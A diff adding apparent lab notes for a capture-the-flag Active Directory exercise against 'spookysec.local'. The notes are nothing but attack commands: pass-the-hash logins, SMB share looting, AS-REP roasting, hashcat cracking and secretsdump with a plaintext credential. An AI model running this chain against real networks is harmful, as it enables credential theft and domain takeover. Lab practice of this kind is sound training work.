@@ -1,0 +1,19 @@
+sudo evil-winrm -i 10.10.19.127 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
+
+ xfreerdp /v:10.10.19.127 /u:Administrator /pth:0e0363213e37b94221497260b0bcb4fc
+ 
+ smbclient -L spookysec.local -U svc-admin
+ 
+ smbclient \\\\spookysec.local\\backup -U svc-admin
+ 
+ in smbclient
+      more
+      get
+      
+      
+
+sudo python3 GetNPUsers.py spookysec.local/svc-admin -no-pass
+
+hashcat -m 18200 svc_admin ./passwordlist.txt --show --force
+
+sudo python3 secretsdump.py spookysec.local/backup:backup2517860@spookysec.local
